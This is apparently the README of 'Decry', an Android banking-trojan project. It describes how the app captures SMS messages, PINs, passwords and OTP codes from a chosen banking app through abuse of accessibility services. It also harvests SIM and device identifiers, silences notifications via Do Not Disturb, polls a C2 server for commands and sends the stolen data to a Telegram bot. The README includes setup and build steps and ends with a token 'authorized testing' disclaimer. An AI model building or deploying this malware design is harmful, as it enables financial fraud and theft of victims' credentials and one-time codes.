# Decry - Android Credential Harvesting Framework

Decry is a Flutter-based Android application designed for credential harvesting from banking applications. It leverages system permissions and accessibility services to capture SMS messages, PIN codes, and passwords entered in target applications.

## Current Architecture

### Data Flow
```
[Victim Device] → [Decry App] → [Telegram Bot (Direct)]
                      ↓
               [C2 Server (Commands Only)]
```

All captured data is sent **directly to Telegram** via bot API. The C2 server is only used for **command polling** - relaying remote commands from the Telegram bot to the device.

### Components

#### 1. Flutter UI (`lib/main.dart`)
- Minimal permission-onboarding interface
- Requests runtime permissions (SMS, Phone)
- Opens Accessibility Settings and Do Not Disturb settings
- Registers device with C2 server
- Polls for commands every 10 seconds

#### 2. MainActivity.kt (`android/app/src/main/kotlin/com/decry/decry/MainActivity.kt`)
- **Permission Management**: Requests READ_SMS, RECEIVE_SMS, READ_PHONE_STATE, READ_PHONE_NUMBERS
- **SIM Collection**: Retrieves phone number, SIM serial, and device ID
- **DND Control**: Toggles Do Not Disturb mode (requires notification policy access)
- **Command Polling**: Polls C2 server for queued commands every 10 seconds
- **Direct Telegram Exfiltration**: All data sent via Telegram bot API
- **Registration**: Sends device registration message to Telegram with SIM info

#### 3. SmsReceiver.kt (`android/app/src/main/kotlin/com/decry/decry/SmsReceiver.kt`)
- Captures incoming SMS messages in real-time
- Only forwards when SMS capture mode is active (triggered by bot command)
- Sends directly to Telegram bot API
- Uses SharedPreferences to track capture state

#### 4. DecryAccessibilityService.kt (`android/app/src/main/kotlin/com/decry/decry/DecryAccessibilityService.kt`)
- Monitors target banking app (configurable package name)
- Captures PIN codes (4-8 digits) from:
  - Text input changes
  - Button click sequences
  - View focus events
  - Node tree traversal
- Captures OTP codes from notifications
- Captures password input from EditText fields
- Sends data via broadcast to DataExfiltratorReceiver

#### 5. DataExfiltratorReceiver.kt (`android/app/src/main/kotlin/com/decry/decry/DataExfiltratorReceiver.kt`)
- Receives broadcast intents from SMS Receiver and Accessibility Service
- Formats data with device info and timestamps
- Sends formatted messages directly to Telegram bot API
- Handles retries and error logging

### Permissions Required
```xml
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
<uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
```

## Setup

### Environment Variables (for direct Telegram exfiltration)
Set these in your build environment or device:
```
CRYTAKE_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
CRYTAKE_CHAT_ID=123456789
```

### Configuration
1. Replace `TARGET_APP_PACKAGE` in `DecryAccessibilityService.kt`:
   ```kotlin
   private const val TARGET_APP_PACKAGE = "com.yourbank.app"
   ```

2. Build the APK:
   ```bash
   flutter build apk --release
   ```

3. Install on target device with all permissions granted

## Current Status
- ✅ Minimal Flutter UI with permission flow
- ✅ Runtime permission requests (SMS, Phone)
- ✅ Accessibility service with credential capture
- ✅ SMS interception with toggleable capture mode
- ✅ Direct Telegram exfiltration
- ✅ DND control (requires notification policy access)
- ✅ SIM number collection
- ✅ Command polling via C2 server
- ✅ Device auto-registration with Telegram bot

## Dependencies
- Flutter SDK 3.35.4+
- Dart SDK 3.9.2+
- Telegram Bot Token
- C2 Server (deployed on Vercel)

## Development Commands
```bash
flutter pub get
flutter analyze
flutter build apk --release
```

## ⚠️ Legal Notice
This software is for security research and authorized testing only. Unauthorized access to computer systems or networks is illegal. Always obtain proper authorization before deploying this application.
